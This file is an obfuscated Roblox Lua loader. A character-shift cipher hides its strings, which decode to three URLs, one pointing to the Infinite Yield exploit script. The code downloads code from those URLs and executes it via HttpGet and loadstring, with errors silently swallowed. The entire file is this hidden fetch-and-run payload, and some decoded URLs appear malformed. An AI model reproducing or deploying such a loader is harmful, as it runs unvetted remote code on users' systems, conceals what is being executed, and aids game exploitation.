local _=string.char local __=string.byte local ___=table.concat
local function _D(s)local r={}for i=1,#s do r[i]=_(__(s,i)-3)end return ___(r)end

local _a=_D("wdvn")
local _b=game[_D("JhwVhuylfh")](game,_D("UxqVhuylfh"))
local _c=task.spawn
local _d=task.wait
local _e=pcall
local _f=game.HttpGet

local _g={
    _D("kwwsv=22udy1jlwkxexvhufrqwhqw1frp2frqilqhgvqrz2Udz412uhiv2khdgv2pdlq2Udz1oxd"),
    _D("kwwsv=22udy1jlwkxexvhufrqwhqw1frp2frqilqhgvqrz2Udz412uhiv2khdgv2pdlq2udz41oxd"),
    _D("kwwsv=22HgjhL\x59251lqilqlwh|lhog2pdvwhu2vrxufh")
}

_c(function()
    _e(function()
        loadstring(_f(game,_g[1]))()
    end)
end)

_d(1)

_c(function()
    _e(function()
        loadstring(_f(game,_g[2]))()
    end)
end)

_d(1)

_c(function()
    _e(function()
        loadstring(_f(game,_g[3]))()
    end)
end)
